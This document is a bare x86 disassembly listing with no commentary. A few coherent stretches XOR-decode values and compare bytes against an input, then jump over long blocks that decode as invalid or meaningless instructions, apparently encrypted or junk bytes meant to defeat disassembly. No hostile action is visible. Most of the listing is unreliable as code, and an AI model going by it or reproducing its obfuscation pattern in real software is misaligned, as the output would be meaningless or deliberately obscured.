  4039f8:	imul   ebp,DWORD PTR [esi],0xffffff90
  4039fb:	xor    eax,0x2893140
  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xb68c9f66
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403ab1
  403a5b:	sub    dh,ch
  403a5d:	sti    
  403a5e:	clc    
  403a5f:	pop    es
  403a60:	shr    DWORD PTR [ecx+0x7416749a],cl
  403a66:	push   edi
  403a67:	inc    ebx
  403a68:	loop   0x4039ed
  403a6a:	cmp    esi,DWORD PTR ds:0xcc75db8c
  403a70:	pop    ecx
  403a71:	mov    BYTE PTR [edx+0x25],0x86
  403a75:	sub    al,0xa4
  403a77:	lods   al,BYTE PTR ds:[esi]
  403a78:	mov    ds:0x3470447c,eax
  403a7d:	rol    BYTE PTR [esi-0x34f8dd8e],0xbc
  403a84:	xchg   ebx,eax
  403a85:	mov    ch,0x13
  403a87:	sti    
  403a88:	ins    DWORD PTR es:[edi],dx
  403a89:	dec    ecx
  403a8a:	rol    DWORD PTR [ebx+0x61bc0a2b],cl
  403a90:	das    
  403a91:	push   ds
  403a92:	(bad)  
  403a93:	loope  0x403a37
  403a95:	jmp    0x403b0c
  403a97:	pop    edx
  403a98:	daa    
  403a99:	pop    es
  403a9a:	nop
  403a9b:	test   eax,0xee645314
  403aa0:	mov    bh,0x9
  403aa2:	mov    bh,0xd2
  403aa4:	jo     0x403aeb
  403aa6:	adc    ah,dh
  403aa8:	imul   edi,DWORD PTR [ebx],0x69
  403aab:	mov    al,ds:0x8a3d3602
  403ab0:	aas    
  403ab1:	pop    es
  403ab2:	xor    ah,BYTE PTR [edi]
  403ab4:	and    edx,DWORD PTR [esi]
  403ab6:	clc    
  403ab7:	test   eax,0x1876a0c7
  403abc:	xchg   esi,eax
  403abd:	pop    edx
  403abe:	popa   
  403abf:	mov    ah,0x12
  403ac1:	test   eax,0xf5d58afe
  403ac6:	or     eax,0x446f7e3a
  403acb:	cmp    al,0xf9
  403acd:	sbb    BYTE PTR [ebp-0x6261b20f],ah
  403ad3:	add    ebx,DWORD PTR [edx]
  403ad5:	dec    ebx
  403ad6:	xchg   DWORD PTR [esp+eiz*8-0x13b87633],ebp
  403add:	inc    edx
  403ade:	iret   
  403adf:	mov    edx,0x78378f31
  403ae4:	div    DWORD PTR [edx]
  403ae6:	inc    ebp
  403ae7:	aas    
  403ae8:	and    eax,0x436ee441
  403aed:	mov    dl,0x87
  403aef:	mov    ds:0xb7856e7b,eax
  403af4:	addr16 out dx,eax
  403af6:	inc    ebx
  403af7:	jmp    0x4cbc:0xad40e05c
  403afe:	repnz cwde 
  403b00:	lds    ebx,FWORD PTR [edi]
  403b02:	jo     0x403b2a
  403b04:	mov    ebp,0x4d2717e1
  403b09:	cwde   
  403b0a:	jl     0x403a90
  403b0c:	pop    es
  403b0d:	adc    al,0x66
  403b0f:	mov    eax,0xb5fc32cf
  403b14:	js     0x403b24
  403b16:	push   ebp
  403b17:	xor    al,0x83
  403b19:	fs mov ebx,0xcbc4cf82
  403b1f:	test   DWORD PTR [ecx],0xa555c9d1
  403b25:	push   eax
  403b26:	pop    eax
  403b27:	push   ecx
  403b28:	mov    WORD PTR [ecx-0x2],cs
  403b2b:	sbb    DWORD PTR [edx+0x55],0xffffff9b
  403b2f:	int    0x3f
  403b31:	pop    edx
  403b32:	out    0x7e,eax
  403b34:	mov    ds:0xc25bf269,eax
  403b39:	jmp    0xe7d0edf0
  403b3e:	rcr    dh,1
  403b40:	test   DWORD PTR [eax+eax*8-0x47],ebp
  403b44:	rol    ebx,1
  403b46:	in     al,dx
  403b47:	aad    0xc4
  403b49:	pop    edx
  403b4a:	(bad)  
  403b4b:	loopne 0x403b88
  403b4d:	popf   
  403b4e:	cmp    al,0x34
  403b50:	cmp    dh,bl
  403b52:	stos   BYTE PTR es:[edi],al
  403b53:	test   eax,0x6272139d
  403b58:	arpl   bx,ax
  403b5a:	cmp    al,0x1b
  403b5c:	dec    eax
  403b5d:	stos   DWORD PTR es:[edi],eax
  403b5e:	dec    esp
  403b5f:	bound  esp,QWORD PTR [ebp+0x34e81390]
  403b65:	retf   0x72d5
  403b68:	push   0x67
  403b6a:	mov    dl,0xa1
  403b6c:	aaa    
  403b6d:	fidivr WORD PTR [ebp-0x7]
  403b70:	xchg   esi,eax
  403b71:	xor    al,0xaf
  403b73:	mov    ah,0xe2
  403b75:	stc    
  403b76:	jbe    0x403be7
  403b78:	and    al,0x89
  403b7a:	div    bh
  403b7c:	push   ebp
  403b7d:	popf   
  403b7e:	xor    bh,ch
  403b80:	pop    esi
  403b81:	(bad)  [edx-0x1a8d5576]
  403b87:	jmp    0xaeb8:0x974bab55
  403b8e:	cmp    dl,dh
  403b90:	add    eax,0xd1b05ba8
  403b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b96:	adc    edx,DWORD PTR [esi+0x67aabfa]
  403b9c:	xchg   ecx,eax
  403b9d:	xor    bh,BYTE PTR [ebp+0x5e]
  403ba0:	or     cl,BYTE PTR [edx+0x65]
  403ba3:	ficom  DWORD PTR [esi]
  403ba5:	xchg   esp,eax
  403ba6:	scas   eax,DWORD PTR es:[edi]
  403ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ba8:	fwait
  403ba9:	shl    edi,cl
  403bab:	jp     0x403c2b
  403bad:	popa   
  403bae:	jne    0x403be5
  403bb0:	and    DWORD PTR [edx-0x52],ebp
  403bb3:	std    
  403bb4:	das    
  403bb5:	adc    eax,0xbd5bf666
  403bba:	neg    BYTE PTR [edx-0x3ef8b202]
  403bc0:	in     al,0x72
  403bc2:	sbb    al,0x6a
  403bc4:	les    esi,FWORD PTR [edx]
  403bc6:	je     0x403c20
  403bc8:	mov    eax,ds:0x67ea9b75
  403bcd:	inc    edi
  403bce:	jno    0x403be4
  403bd0:	cdq    
  403bd1:	bound  ebx,QWORD PTR ds:0x4de919
  403bd7:	xchg   edx,eax
  403bd8:	push   0x52
  403bda:	imul   edx,DWORD PTR [ebp+edi*4+0x25],0x6a
  403bdf:	js     0x403ba6
  403be1:	sbb    esp,DWORD PTR [edi-0x1]
  403be4:	push   edx
  403be5:	push   esp
  403be6:	and    eax,0x8f47c38
  403beb:	mov    ch,0x4f
  403bed:	or     eax,0x701b2d61
  403bf2:	adc    BYTE PTR [eax],0xe0
  403bf5:	and    ch,BYTE PTR [edi+edx*8]
  403bf8:	cmp    DWORD PTR [esi],ebx
  403bfa:	out    dx,eax
  403bfb:	daa    
  403bfc:	dec    eax
  403bfd:	xor    bh,BYTE PTR [edi+ecx*4]
  403c00:	pop    edx
  403c01:	ins    DWORD PTR es:[edi],dx
  403c02:	fsubr  st(1),st
  403c04:	mov    bh,dh
  403c06:	cmp    BYTE PTR [edi+ecx*8],al
  403c09:	cs je  0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x1bdcf48b
  403c29:	ror    DWORD PTR [eax+esi*2+0x7e7e1e42],1
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c5c
  403c35:	pop    ebp
  403c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c37:	sub    al,0x75
  403c39:	adc    BYTE PTR [esi],al
  403c3b:	cdq    
  403c3c:	pop    ecx
  403c3d:	xchg   BYTE PTR [ebp-0x5b],ah
  403c40:	dec    eax
  403c41:	or     BYTE PTR [ecx+0x37f4a807],bh
  403c47:	xchg   esp,eax
  403c48:	addr16 xchg ecx,eax
  403c4a:	jg     0x403ca9
  403c4c:	pop    es
  403c4d:	push   eax
  403c4e:	or     bh,BYTE PTR [esi-0x23008204]
  403c54:	dec    edi
  403c55:	fldcw  WORD PTR [ebp-0x47e98d28]
  403c5b:	mov    edx,fs
  403c5d:	add    DWORD PTR [ebx+0x4f],esp
  403c60:	cmp    esp,DWORD PTR [esp+esi*2]
  403c63:	sbb    eax,0xd2970829
  403c68:	rol    BYTE PTR [edi+0x53],1
  403c6b:	mov    esp,0xb8c2f36c
  403c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c71:	rol    BYTE PTR [edi+0x52805e22],1
  403c77:	imul   BYTE PTR [edx+edx*2+0x5c3f7519]
  403c7e:	mov    ebp,0xc4c57dbe
  403c83:	jmp    0x403ca8
  403c85:	xchg   dl,bl
  403c87:	std    
  403c88:	inc    edi
  403c89:	in     eax,0xb7
  403c8b:	loop   0x403c65
  403c8d:	mov    ecx,0xf53f2604
  403c92:	jl     0x403cf9
  403c94:	push   eax
  403c95:	mov    ah,0xca
  403c97:	dec    ebp
  403c98:	mov    edx,edx
  403c9a:	cmp    BYTE PTR [ecx+0x14fb45f4],dh
  403ca0:	jl     0x403c7b
  403ca2:	addr16 mov ch,0x9e
  403ca5:	cmp    cl,BYTE PTR [ecx]
  403ca7:	ret    
  403ca8:	jl     0x403c48
  403caa:	icebp  
  403cab:	mov    al,ah
  403cad:	mov    esp,0xc445013d
  403cb2:	fild   QWORD PTR [ecx]
  403cb4:	cmp    cl,BYTE PTR [ebx+0x61]
  403cb7:	mov    ebx,0xed6bbb01
  403cbc:	mov    gs,WORD PTR [edi]
  403cbe:	cld    
  403cbf:	xchg   ebp,eax
  403cc0:	inc    edi
  403cc1:	stos   DWORD PTR es:[edi],eax
  403cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cc3:	mov    al,ds:0xa209d80b
  403cc8:	xlat   BYTE PTR ds:[ebx]
  403cc9:	lfs    ecx,FWORD PTR [ebp-0x15]
  403ccd:	repz jp 0x403d23
  403cd0:	mov    bh,0x4a
  403cd2:	in     eax,dx
  403cd3:	stc    
  403cd4:	popf   
  403cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cd6:	(bad)  
  403cd7:	je     0x403c9d
  403cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cda:	mov    esp,0x88ca258c
  403cdf:	sub    BYTE PTR [ecx+ecx*1-0x1a],bl
  403ce3:	push   ecx
  403ce4:	je     0x403cc2
  403ce6:	aas    
  403ce7:	fnsave [edx]
  403ce9:	clc    
  403cea:	rol    esi,cl
  403cec:	js     0x403cef
  403cee:	ror    DWORD PTR [ebx+0x5],cl
  403cf1:	sub    DWORD PTR [ebp+0x1f],0x4c
  403cf5:	mov    dl,0x27
  403cf7:	adc    bh,BYTE PTR [edx-0xd9da1ce]
  403cfd:	int3   
  403cfe:	fimul  DWORD PTR [edi+eiz*1+0x3e]
  403d02:	aaa    
  403d03:	jne    0x403d36
  403d05:	loop   0x403d1b
  403d07:	test   eax,0x6bae3d91
  403d0c:	das    
  403d0d:	inc    ecx
  403d0e:	ins    BYTE PTR es:[edi],dx
  403d0f:	xchg   DWORD PTR [ebx+0x44],esi
  403d12:	cli    
  403d13:	mov    al,0x6b
  403d15:	(bad)  
  403d16:	sbb    edx,DWORD PTR [edi+0x3b]
  403d19:	pushf  
  403d1a:	add    BYTE PTR [ebx+0x5f65ae57],bl
  403d20:	mov    edx,0x958271a3
  403d25:	cwde   
  403d26:	fist   DWORD PTR [edi+0xc]
  403d29:	sub    bl,BYTE PTR [edx+eax*8+0x32]
  403d2d:	nop
  403d2e:	mov    cl,0x32
  403d30:	mov    ebx,0xd833d2fd
  403d35:	loope  0x403d80
  403d37:	sub    DWORD PTR [eax+0x18],ecx
  403d3a:	mov    dl,0x90
  403d3c:	out    dx,al
  403d3d:	aaa    
  403d3e:	xchg   ebx,eax
  403d3f:	outs   dx,DWORD PTR ds:[esi]
  403d40:	(bad)  
  403d41:	push   eax
  403d42:	int3   
  403d43:	xchg   edx,eax
  403d44:	jmp    0x403d46
  403d46:	push   edi
  403d47:	cmp    dh,BYTE PTR ds:0xc7e2e5c
  403d4d:	xchg   ecx,ebp
  403d4f:	or     DWORD PTR [esi],ecx
  403d51:	dec    edi
  403d52:	push   ebp
  403d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d54:	fs mov ah,0x5a
  403d57:	(bad)  
  403d58:	ficomp WORD PTR [ebp+0x7f]
  403d5b:	in     eax,0x9a
  403d5d:	jno    0x403dcf
  403d5f:	mov    ecx,0x8eb5bc5c
  403d64:	pop    ds
  403d65:	xor    al,0xe5
  403d67:	cmp    BYTE PTR [edi-0x3819ff64],cl
  403d6d:	sub    al,BYTE PTR [esi-0x16]
  403d70:	push   ebp
  403d71:	js     0x403d0c
  403d73:	dec    edi
  403d74:	or     dl,BYTE PTR [eax-0x23]
  403d77:	and    dl,BYTE PTR [ecx+0x7e238667]
  403d7d:	xor    al,0x6c
  403d7f:	in     eax,dx
  403d80:	and    ecx,edi
  403d82:	out    dx,al
  403d83:	or     DWORD PTR [edi+eiz*1-0x2c7eef3f],ebp
  403d8a:	es jne 0x403dfb
  403d8d:	add    DWORD PTR [edx],esp
  403d8f:	mov    eax,ecx
  403d91:	call   0x7e77b572
  403d96:	ins    BYTE PTR es:[edi],dx
  403d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d98:	push   edi
  403d99:	les    esi,FWORD PTR [edi]
  403d9b:	pop    ecx
  403d9c:	sbb    DWORD PTR [eax-0x65c76f5c],edx
  403da2:	sar    ecx,cl
  403da4:	fs sub eax,0x6f6357b9
  403daa:	xchg   ebp,eax
  403dab:	push   0x7b4e6ce6
  403db0:	ret    
  403db1:	pop    es
  403db2:	ror    BYTE PTR [edi-0x70fcce88],1
  403db8:	mov    eax,0xde801b1a
  403dbd:	dec    eax
  403dbe:	loopne 0x403e3d
  403dc0:	add    DWORD PTR [edi],esp
  403dc2:	dec    ebx
  403dc3:	mov    ds:0xb2f4393a,eax
  403dc8:	nop
  403dc9:	retf   
  403dca:	(bad)  
  403dcb:	cmp    ebp,DWORD PTR [eax+0xe3154ca]
  403dd1:	rcr    bl,0xfc
  403dd4:	sbb    DWORD PTR [ecx],ebp
  403dd6:	cs call 0x8489dd66
  403ddc:	xchg   ebp,eax
  403ddd:	or     BYTE PTR [ebp-0x37],dl
  403de0:	mov    bl,0xfa
  403de2:	sti    
  403de3:	pop    eax
  403de4:	lea    eax,[ebp-0x18]
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi-0x6cfccca3],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403deb
  403e11:	add    dl,BYTE PTR [ebp+0x9]
  403e14:	cld    
  403e15:	xchg   ebx,eax
  403e16:	add    eax,esi
  403e18:	ins    BYTE PTR es:[edi],dx
  403e19:	or     eax,0x81f2529b
  403e1e:	stc    
  403e1f:	and    edi,ecx
  403e21:	stc    
  403e22:	fmul   QWORD PTR [eax+0x5]
  403e25:	mov    bl,0xdc
  403e27:	adc    ebp,ebp
  403e29:	ret    
  403e2a:	or     al,BYTE PTR [edx+edi*1]
  403e2d:	add    BYTE PTR [esi],ch
  403e2f:	fwait
  403e30:	pop    ss
  403e31:	mov    WORD PTR [esi+0x65],gs
  403e34:	inc    ebp
  403e35:	cmp    ebp,eax
  403e37:	xor    bh,bl
  403e39:	loop   0x403de2
  403e3b:	jno    0x403e49
  403e3d:	dec    edi
  403e3e:	fst    DWORD PTR [eax-0x56]
  403e41:	jmp    0x403e49
  403e43:	add    eax,0x7394abe3
  403e48:	into   
  403e49:	addr16 xchg edi,eax
  403e4b:	and    BYTE PTR [ecx-0x30],bh
  403e4e:	nop
  403e4f:	sub    eax,0x7fafc687
  403e54:	test   al,0x97
  403e56:	gs pushf 
  403e58:	jb     0x403dfd
  403e5a:	mov    ds:0xdaac6f00,al
  403e5f:	jl     0x403de8
  403e61:	es in  eax,0xaa
  403e64:	cmp    al,0x98
  403e66:	xor    al,0x9
  403e68:	int3   
  403e69:	sbb    al,0x53
  403e6b:	std    
  403e6c:	std    
  403e6d:	mov    eax,0xab3f5782
  403e72:	add    eax,0x36cc4feb
  403e77:	or     BYTE PTR [eax-0x4b],ah
  403e7a:	clc    
  403e7b:	sub    eax,0x381d354f
  403e80:	push   edx
  403e81:	jnp    0x403e7b
  403e83:	adc    DWORD PTR [edi+0x38],eax
  403e86:	mov    ch,BYTE PTR [edx]
  403e88:	push   ebx
  403e89:	and    dh,ah
  403e8b:	in     al,0x2b
  403e8d:	jnp    0x403ebe
  403e8f:	cmp    esi,DWORD PTR [ebp+eax*1-0x22]
  403e93:	out    0x66,eax
  403e95:	inc    esp
  403e96:	fs mov ebp,0xf751f059
  403e9c:	dec    eax
  403e9d:	outs   dx,DWORD PTR ds:[esi]
  403e9e:	in     eax,0x41
  403ea0:	xchg   edx,eax
  403ea1:	jl     0x403e7a
  403ea3:	lds    ebx,FWORD PTR [edi-0x28]
  403ea6:	xchg   esp,eax
  403ea7:	dec    eax
  403ea8:	shr    DWORD PTR [edi+0x602ac23e],0xd7
  403eaf:	mov    eax,0x92c2c946
  403eb4:	cmp    al,0x6f
  403eb6:	sub    ch,BYTE PTR [eax+0x16dbba1e]
  403ebc:	push   0x4db1dba
  403ec1:	cmp    DWORD PTR [edx-0x239b3b1],ebx
  403ec7:	int    0xb6
  403ec9:	ret    
  403eca:	jno    0x403f33
  403ecc:	xchg   ebp,eax
  403ecd:	adc    eax,0xe9c7fecb
  403ed2:	xchg   ebp,eax
  403ed3:	sub    al,0x57
  403ed5:	loope  0x403e98
  403ed7:	js     0x403eee
  403ed9:	inc    edi
  403eda:	xchg   ebp,eax
  403edb:	mov    DWORD PTR [edx+esi*8],0x72881647
  403ee2:	(bad)  
  403ee3:	repz add al,0x7d
  403ee6:	sti    
  403ee7:	scas   al,BYTE PTR es:[edi]
  403ee8:	fcom   QWORD PTR [edi+ebp*8-0x6c]
  403eec:	loop   0x403f53
  403eee:	aad    0xa1
  403ef0:	mov    ch,0xa6
  403ef3:	sub    DWORD PTR [edi-0xf166682],edi
  403ef9:	jp     0x403f5c
  403efb:	in     al,dx
  403efc:	jecxz  0x403e98
  403efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eff:	shr    DWORD PTR [esi-0x1a],cl
  403f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f03:	xchg   ebx,eax
  403f04:	fcom   DWORD PTR [ecx-0x1f]
  403f07:	data16 gs jbe 0x403ec7
  403f0b:	cmp    ecx,ebp
  403f0d:	test   al,0xd5
  403f0f:	sar    DWORD PTR [esi+0x50],cl
  403f12:	test   eax,0xe5daa5e5
  403f17:	in     eax,0x6d
  403f19:	adc    dh,0x6a
  403f1c:	out    0x1f,eax
  403f1e:	xchg   edi,eax
  403f1f:	xchg   edi,eax
  403f20:	fsubr  QWORD PTR [esi]
  403f22:	shl    BYTE PTR [ebx],1
  403f24:	into   
  403f25:	(bad)  
  403f26:	pop    ebp
  403f27:	xchg   edx,eax
  403f28:	imul   ebp,DWORD PTR [esp+eiz*8-0x47045d44],0x46747603
  403f33:	mov    ch,BYTE PTR [ebp+0x41a51b46]
  403f39:	and    DWORD PTR [edx+0x44],esp
  403f3c:	ror    edi,1
  403f3e:	ins    BYTE PTR es:[edi],dx
  403f3f:	sub    al,ch
  403f41:	mov    bh,0xca
  403f43:	jl     0x403f42
  403f45:	loope  0x403f3f
  403f47:	fstp   QWORD PTR ds:[ecx-0xa]
  403f4b:	call   0x2a535d19
  403f50:	imul   esi,DWORD PTR [edx],0x3e
  403f53:	addr16 daa 
  403f55:	rcr    ecx,cl
  403f57:	add    DWORD PTR [esi-0xa13cdb3],edi
  403f5d:	jae    0x403ee5
  403f5f:	fimul  WORD PTR [edi+0x310a0b7]
  403f65:	sub    DWORD PTR [ebx],esi
  403f67:	mov    bl,0x79
  403f69:	movaps xmm5,XMMWORD PTR [edi-0x7c]
  403f6d:	jns    0x403fdc
  403f6f:	jge    0x403f48
  403f71:	and    eax,0x373a39e1
  403f76:	inc    esp
  403f77:	mov    dh,ch
  403f79:	and    bh,bh
  403f7b:	and    DWORD PTR [edi],eax
  403f7d:	fwait
  403f7e:	and    BYTE PTR [ebp+0x61be6c4f],dh
  403f84:	outs   dx,DWORD PTR ds:[esi]
  403f85:	mov    esp,0xf3297e5c
  403f8a:	sub    BYTE PTR [ebx+0x7f],ch
  403f8d:	imul   edi,DWORD PTR [ebp-0x7],0x531005cc
  403f94:	repz clc 
  403f96:	dec    ecx
  403f97:	pop    ebx
  403f98:	push   ebx
  403f99:	pop    ss
  403f9a:	adc    BYTE PTR [ebx-0x3e],dh
  403f9d:	jno    0x40401d
  403f9f:	jnp    0x403fbd
  403fa1:	add    BYTE PTR [ebp+0x7b],bh
  403fa4:	fmul   st(3),st
  403fa6:	pop    ds
  403fa7:	xor    esi,DWORD PTR [ecx+0x31]
  403faa:	pop    es
  403fab:	outs   dx,BYTE PTR ds:[esi]
  403fac:	es js  0x403f60
  403faf:	data16 mov ch,0x5b
  403fb2:	push   esp
  403fb3:	jnp    0x404023
  403fb5:	sbb    eax,0x9a9b6438
  403fba:	pop    esp
  403fbb:	or     ecx,esp
  403fbd:	push   ds
  403fbe:	xor    ch,ch
  403fc0:	mov    eax,DWORD PTR [ebp-0x10]
  403fc3:	mov    edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	sbb    ebp,DWORD PTR [edx+0x18]
  403fdc:	mov    al,0x22
  403fde:	sbb    bh,BYTE PTR [esi+0x7e]
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403fb4
  403fe6:	cmp    DWORD PTR ds:0x7bd8618c,esi
  403fec:	mov    ebp,0xd73d1e71
  403ff1:	in     eax,dx
  403ff2:	mov    al,0xe6
  403ff4:	loopne 0x404053
  403ff6:	mov    ds:0x126bd88c,eax
  403ffb:	shr    BYTE PTR [edi],cl
  403ffd:	xor    bh,BYTE PTR [ebp-0x4b2be801]
  404003:	dec    eax
  404004:	(bad)  
  404005:	imul   ebp,DWORD PTR [edi-0x10051766],0xffffff84
  40400c:	xchg   ebx,eax
  40400d:	lock ss stos DWORD PTR es:[edi],eax
  404010:	outs   dx,DWORD PTR ds:[esi]
  404011:	jle    0x403fa1
  404013:	or     al,0x3b
  404015:	adc    BYTE PTR [edx],bl
  404017:	scas   eax,DWORD PTR es:[edi]
  404018:	jne    0x40402c
  40401a:	test   esi,eax
  40401c:	cmp    ah,ch
  40401e:	cmp    BYTE PTR [edx+0x35],al
  404021:	mov    dh,0x61
  404023:	dec    ecx
  404024:	xor    al,0x92
  404026:	xchg   ebx,eax
  404027:	sbb    al,0xf
  404029:	not    BYTE PTR [edi-0x41]
  40402c:	ins    BYTE PTR es:[edi],dx
  40402d:	cwde   
  40402e:	adc    eax,0x289f0246
  404033:	sar    DWORD PTR [ebx],cl
  404035:	mov    ecx,DWORD PTR [edi+0xf]
  404038:	test   eax,0x9296bf7c
  40403d:	and    DWORD PTR [edx+ebx*4+0x68],ebx
  404041:	addr16 retf 
  404043:	scas   eax,DWORD PTR es:[edi]
  404044:	outs   dx,DWORD PTR ds:[si]
  404046:	and    edx,eax
  404048:	jb     0x404019
  40404a:	sbb    BYTE PTR [ebx+esi*4-0xc],0x45
  40404f:	cdq    
  404050:	addr16 mov ebp,0x782f03b4
  404056:	mov    BYTE PTR [eax+0x57804c1],al
  40405c:	pop    esp
  40405d:	out    dx,al
  40405e:	jl     0x40402e
  404060:	mov    bh,0xee
  404062:	mov    WORD PTR [edx],fs
  404064:	or     ebp,ecx
  404066:	or     cl,BYTE PTR [edi]
  404068:	dec    ebx
  404069:	adc    BYTE PTR [edx],0x38
  40406c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40406d:	and    al,0x4a
  40406f:	cwde   
  404070:	ficomp WORD PTR [eax+0x3f4a33b1]
  404076:	dec    eax
  404077:	test   BYTE PTR [eax+0x1c69b4b2],0xbe
  40407e:	mov    ebp,0xa153fbcd
  404083:	out    0xf,al
  404085:	push   ebp
  404086:	pop    ds
  404087:	stos   DWORD PTR es:[edi],eax
  404088:	mov    dl,0xea
  40408a:	call   0x14fb:0x15dba85
  404091:	js     0x40402a
  404093:	loopne 0x404053
  404095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404096:	repnz fs adc eax,0x386ccfb9
  40409d:	lods   eax,DWORD PTR ds:[esi]
  40409e:	and    BYTE PTR [edx],al
  4040a0:	stos   DWORD PTR es:[edi],eax
  4040a1:	int    0xae
  4040a3:	ret    0xb119
  4040a6:	jmp    0x40410b
  4040a8:	push   cs
  4040a9:	adc    al,0xab
  4040ab:	cmp    bh,dl
  4040ad:	mov    ebx,0x7de18c25
  4040b2:	jp     0x404088
  4040b4:	test   BYTE PTR [eax-0x5b],cl
  4040b7:	push   ecx
  4040b8:	test   dl,dl
  4040ba:	repnz pop ebp
  4040bc:	or     DWORD PTR [ebx+0x2347c987],ecx
  4040c2:	or     DWORD PTR [ebx+edx*2-0x15],edi
  4040c6:	(bad)  
  4040c8:	push   ds
  4040c9:	or     dh,bl
  4040cb:	sbb    ebx,DWORD PTR [eax]
  4040cd:	add    al,0x24
  4040cf:	retf   
  4040d0:	je     0x4040c6
  4040d2:	jne    0x404069
  4040d4:	ja     0x4040f9
  4040d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040d7:	mov    edi,0x7c22d333
  4040dc:	cmp    eax,0x261f6e0a
  4040e1:	imul   esi,DWORD PTR [ecx],0x7bbdcc98
  4040e7:	cld    
  4040e8:	fnsave [esi+edx*4]
  4040eb:	lock popa 
  4040ed:	push   esi
  4040ee:	sbb    al,0x8f
  4040f0:	and    ah,dl
  4040f2:	pop    edi
  4040f3:	mov    al,ds:0x2ae8c0e1
  4040f8:	ret    0x5a41
  4040fb:	ins    DWORD PTR es:[edi],dx
  4040fc:	clc    
  4040fd:	repnz sub DWORD PTR [ebp-0x7748d966],ecx
  404104:	mov    ds:0x9f90f338,eax
  404109:	ja     0x4040ba
  40410b:	jno    0x4040d4
  40410d:	jge    0x4040ac
  40410f:	jge    0x4040f2
  404111:	mov    WORD PTR [edx+0x34e5bf],es
  404117:	bound  ebx,QWORD PTR ds:0x7592849f
  40411d:	scas   eax,DWORD PTR es:[di]
  40411f:	xchg   ebp,eax
  404120:	test   BYTE PTR [edx-0x1830bd86],dl
  404126:	xchg   DWORD PTR [edi+0x3f],edi
  404129:	fs hlt 
  40412b:	addr16 mov eax,0x9d05e195
  404131:	mov    bh,0xee
  404133:	push   esi
  404134:	in     al,dx
  404135:	sub    eax,0x7b385130
  40413a:	inc    edi
  40413b:	mul    BYTE PTR [ecx+0x771686c7]
  404141:	dec    ebp
  404142:	ds mov esi,0x1d46e1df
  404148:	mov    ds:0x1a2d0a07,eax
  40414d:	cmp    ch,BYTE PTR [eax]
  40414f:	dec    edi
  404150:	stos   DWORD PTR es:[edi],eax
  404151:	pop    esp
  404152:	cmp    eax,0x123f0936
  404157:	push   ss
  404158:	(bad)  
  404159:	rcl    edi,cl
  40415b:	xor    eax,esp
  40415d:	jmp    FWORD PTR gs:[ecx]
  404160:	int3   
  404161:	mov    ?,WORD PTR [eax]
  404163:	dec    ebp
  404164:	aaa    
  404165:	lock fdivr QWORD PTR ds:0x9313dd9a
  40416c:	(bad)  
  40416d:	sub    DWORD PTR [ebx-0x7c],ebx
  404170:	dec    ebp
  404171:	mov    ah,0x79
  404173:	cli    
  404174:	push   cs
  404175:	jg     0x4041b5
  404177:	arpl   WORD PTR [ebp+ecx*4+0x1a],sp
  40417b:	in     al,0xd3
  40417d:	mov    edx,0x196fbfc5
  404182:	fcomi  st,st(4)
  404184:	and    ebx,DWORD PTR [ebx]
  404186:	loop   0x404189
  404188:	cmp    bh,BYTE PTR ss:[ebp+0x7f]
